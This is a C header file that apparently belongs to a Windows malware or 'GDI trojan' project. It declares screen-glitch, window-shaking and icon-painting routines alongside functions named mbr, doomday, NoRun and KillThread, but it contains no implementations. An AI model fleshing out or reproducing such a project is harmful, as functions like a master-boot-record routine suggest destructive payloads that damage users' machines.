#pragma once

#pragma comment(lib, "winmm.lib")

#include <windows.h>
#include <commctrl.h>
#include <math.h>

// main.c
int fr();
int doomday();
int KillThread(HANDLE thread);

// iconfollow.c
DWORD WINAPI Follow(LPVOID parameter);

// gdi.c
DWORD WINAPI EBOLA(LPVOID parameter);
DWORD WINAPI Clench(LPVOID parameter);
DWORD WINAPI day30_(LPVOID parameter);
DWORD WINAPI CopyLag(LPVOID parameter);
DWORD WINAPI IconWave(LPVOID parameter);
DWORD WINAPI SetIcons(LPVOID parameter);
DWORD WINAPI UpTunnel(LPVOID parameter);
DWORD WINAPI InAndOut(LPVOID parameter);
DWORD WINAPI RandomMsg(LPVOID parameter);
DWORD WINAPI GlitchDown(LPVOID parameter);
DWORD WINAPI IconPainter(LPVOID parameter);
DWORD WINAPI WindowFucker(LPVOID parameter);
DWORD WINAPI CoolIconDraw(LPVOID parameter);
DWORD WINAPI ShakeWindows(LPVOID parameter);
DWORD WINAPI GlitchAround(LPVOID parameter);
DWORD WINAPI UpDownGlitch(LPVOID parameter);
DWORD WINAPI DeepUnderMove(LPVOID parameter);
DWORD WINAPI SlowInvertPaint(LPVOID parameter);
DWORD WINAPI FlipStrechGlitch(LPVOID parameter);
DWORD WINAPI RightDownEnlarge(LPVOID parameter);
BOOL CALLBACK WindowLongFucker(LPVOID parameter);

// config.c
int mbr();
DWORD WINAPI NoRun(LPVOID parameter);
DWORD CALLBACK CallBox(LPVOID parameter);

char* mkrndstr(size_t length);